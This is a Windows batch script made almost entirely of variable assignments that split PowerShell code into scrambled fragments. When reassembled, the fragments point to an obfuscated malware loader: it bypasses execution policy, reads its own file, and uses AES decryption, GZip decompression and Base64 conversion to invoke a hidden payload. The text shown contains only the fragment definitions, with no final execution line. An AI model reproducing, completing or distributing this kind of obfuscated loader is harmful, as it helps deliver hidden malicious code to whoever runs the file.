@echo off
set "jUAiqGIRkO=ke($"
set "EEjuOvqKuD=Yc, "
set "CugjOJKFkM=TllA"
set "EjJliZIEIt=tsWi"
set "IzqaAnmUkj=[Sys"
set "AExbROhqIo=.IO."
set "JUpvkufbzh=comm"
set "eGDrADEdNV=ss -"
set "HZlYqvNIcc=('l0"
set "vddrFmgqBv= [st"
set "qARQVebbHX=6] -"
set "jHHgAwJvTD= = $"
set "WlUmTUXFsF=  $J"
set "ejIrChkmKi=H.Su"
set "xVcJHSIbhA=Syst"
set "WUltadYJhW='')("
set "uWHyCBfiis=tem."
set "fMcEcUdqFo=ose("
set "DQJMhXNntG='dqR"
set "BHFsEUSZWt=.GZi"
set "nczbldUNWU=m.Re"
set "lBmlnHyxCY=stem"
set "BEQcQpJGxX=iron"
set "SzGCTKBkNH=] -j"
set "LSFoViBCyU=$sOk"
set "eDcutSyTDQ=('%*'"
set "eexzMVujxp=.Dis"
set "uHkmjOtrec=('%~f0'"
set "wRhJZSvLBH=ay()"
set "fIpWTtiFWV=.Cre"
set "SyTHdrvDvr=)) {"
set "huDPEhdMPZ=vert"
set "xSoYixUGFI=ert]"
set "qiXAEEJmND=QI);"
set "nAxMhUmmEN=ateD"
set "PaLYbGlanh=; };"
set "nCWJBawpBx=File"
set "vOLjFUWUeR=join"
set "mwKLgGXdWS=brea"
set "VLPZzypNeG=ewLi"
set "fBSTowlYeY=ew-O"
set "zNWKpyEauV=.-16"
set "BHToPyMFUY=Xfuv"
set "WBkicperNB=null"
set "QRUWLGcNqu=yste"
set "lWVwgmyUyN=se()"
set "lMrhPfvlnz=New-"
set "vrSlQpBxZV=ZYYc"
set "uCcuQfojJn=nage"
set "WynkVWqZdR=:('g"
set "AzjlzFkbqm=bypa"
set "siiiFDCAPc=form"
set "wBqLXFEFHT=ress"
set "URXseedPId=ptog"
set "LLneNQmfZp==');"
set "LfMwnuXCHl=Jv);"
set "YKpgicWKgk=1] -"
set "SOZjulCvEz=Jv.T"
set "eQBqXNvbzx=ress"
set "nPIKOwTgSu=PKCS"
set "eYoJRsSbmX=$Xfu"
set "FTbtuxLWXI=oL'["
set "NaMhzFigpz=OyzA"
set "bsorGqjEYH=($bK"
set "zJNvymxgii= '')"
set "ACRomvuyKY=Invo"
set "ogtQNtAWPi=daeR"
set "lThJVrioJd=ion."
set "LmpmCKDvMp=::De"
set "MLSvYMvpHf=yste"
set "IALDVGCBKR=736u"
set "dfPVVrjIIQ=lit("
set "ocAJSMGtHo=ptog"
set "RGaNXwxQli=pose"
set "FBCjkxXadJ=$yQX"
set "QWPsDAcFOQ=.Com"
set "pjXjPKrblY=[Sys"
set "nejzrFfbqe=6esa"
set "dTfNHipEJa=Stre"
set "BEPITBonXw=rity"
set "AeODrFQDFP=JWH."
set "nbzdMGgOke=Jv ="
set "UdcWABTebo=Secu"
set "AiBiTKKOxc= [Sy"
set "aCWJFjsQnK=ypto"
set "LwNgMNJIkG=morF"
set "qqLokZYPtJ=Comp"
set "rNwMqMmImX=DDvz"
set "dzNIfhFmUQ=, $y"
set "SZyJibZEsO=join"
set "QBtRIxDgNA=pres"
set "oBVoQjzCIk=yTo("
set "aSYNkTivYU=-joi"
set "wysotjiiOs=ct S"
set "fWMzSztVub=Syst"
set "htUKctYkqO=pose"
set "AZdPZxLuaI=ddin"
set "cLzKrMspfl=urit"
set "mxPwIpFSzb=gth)"
set "hGzRcblgcZ=VuN."
set "ACnzAGVcgE=7;$g"
set "ZyOyItvZHS=;$nF"
set "IebspdIkCG=.Sec"
set "nCEeaWGvSM=m.IO"
set "BCccGzOQfh=esMa"
set "NYOoDsprBi=Disp"
set "aEnnahjNTg=M.En"
set "PeOjyLFCFb=QXQI"
set "czigHeYtVN=New-"
set "NtmYIOYOOF=();$"
set "dOoQkexvze=OkJv"
set "HCkLICUUGC=ne);"
set "jIgYBnOExE=-4] "
set "qgPSwpaiPp=)($J"
